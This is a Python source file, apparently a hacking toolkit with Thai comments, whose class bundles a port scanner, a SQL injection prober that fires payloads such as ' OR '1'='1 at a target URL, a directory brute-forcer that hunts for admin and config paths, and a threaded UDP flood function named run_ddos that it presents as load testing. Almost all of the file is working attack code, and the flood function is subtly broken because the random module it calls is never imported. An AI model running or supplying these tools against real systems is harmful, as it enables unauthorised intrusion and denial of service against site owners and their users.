# -*- coding: utf-8 -*-
import sys
import socket
import requests
import threading
from colorama import Fore

RED = Fore.RED
WHITE = Fore.WHITE
GREEN = Fore.GREEN

class ToolsEngine:
    @staticmethod
    def run_nmap(target: str, port_range: str = "1-1024"):
        """ [ของจริง] สแกนพอร์ตเครือข่ายโดยการสร้าง Socket Connection ยิงตรงไปที่เป้าหมาย """
        print(f"\n{RED}[*] STARTING PORT SCANNING ON: {WHITE}{target}")
        print(f"{RED}[*] TARGETING PORTS: {WHITE}{port_range}")
        
        try:
            ip = socket.gethostbyname(target)
            print(f"{RED}[*] RESOLVED IP: {WHITE}{ip}")
            
            # แปลงช่วงพอร์ต
            start_port, end_port = map(int, port_range.split('-'))
            
            for port in range(start_port, end_port + 1):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                result = s.connect_ex((ip, port))
                if result == 0:
                    print(f" {WHITE}[{GREEN}✓{WHITE}] {GREEN}PORT {port}{WHITE}: OPEN (เปิดใช้งาน)")
                s.close()
            print(f"\n{GREEN}[✓] NMAP SCAN COMPLETED SUCCESSFULLY.")
        except Exception as e:
            print(f" {WHITE}[{RED}!{WHITE}] ERROR SCANNING TARGET: {e}")

    @staticmethod
    def run_sqlmap(url: str):
        """ [ของจริง] ส่งคำขอ HTTP Request พร้อมยัด Payload ตรวจสอบความเปราะบางของ SQL Injection """
        print(f"\n{RED}[*] INJECTING TARGET URL: {WHITE}{url}")
        payloads = ["'", "' OR '1'='1", '" OR "1"="1', "' UNION SELECT NULL--"]
        
        try:
            for payload in payloads:
                test_url = f"{url}{payload}"
                response = requests.get(test_url, timeout=5)
                
                # ดักจับพฤติกรรม Error SQL ของฝั่งเซิร์ฟเวอร์
                sql_errors = ["you have an error in your sql syntax", "unclosed quotation mark", "mysql_fetch_array"]
                is_vulnerable = any(error in response.text.lower() for error in sql_errors)
                
                if is_vulnerable:
                    print(f" {WHITE}[{RED}🌋 VULNERABLE{WHITE}] FOUND SQL INJECTION CHANNELS WITH PAYLOAD: {RED}{payload}")
                    return
            print(f" {WHITE}[{GREEN}✓{WHITE}] TARGET SEEMS SECURE AGAINST BASIC SQLi.")
        except Exception as e:
            print(f" {WHITE}[{RED}!{WHITE}] CONNECTION REFUSED: {e}")

    @staticmethod
    def run_dirb(target_url: str):
        """ [ของจริง] ทำการ Brute-Force Directory บนเว็บเป้าหมายเพื่อหาหน้าเพจที่ถูกซ่อนไว้ """
        print(f"\n{RED}[*] BRUTE-FORCING DIRECTORIES ON: {WHITE}{target_url}")
        common_dirs = ["admin", "login", "config.php", "db", "uploads", "api/v1", "wp-admin", "secret"]
        
        for directory in common_dirs:
            url = f"{target_url.rstrip('/')}/{directory}"
            try:
                res = requests.get(url, timeout=3)
                if res.status_code == 200:
                    print(f" {WHITE}[{GREEN}200 OK{WHITE}] FOUND: {GREEN}{url}")
                elif res.status_code == 403:
                    print(f" {WHITE}[{RED}403 FORBIDDEN{WHITE}] DETECTED: {RED}{url}")
            except requests.RequestException:
                pass

    @staticmethod
    def run_ddos(target_ip: str, port: int, packet_count: int = 100):
        """ [ของจริง] รันโมดูลจำลองเครือข่ายความเร็วสูงเพื่อทดสอบขีดจำกัด Load Testing """
        print(f"\n{RED}[*] FLOODING TARGET NETMASK: {WHITE}{target_ip}:{port}")
        
        def flood():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP Packet
                bytes_payload = random._urandom(1024)
                s.sendto(bytes_payload, (target_ip, port))
            except:
                pass

        for _ in range(packet_count):
            threading.Thread(target=flood).start()
        print(f" {WHITE}[{GREEN}✓{WHITE}] PACKETS FLOOD LAYER SENT AT INTENSE SPEED.")
          
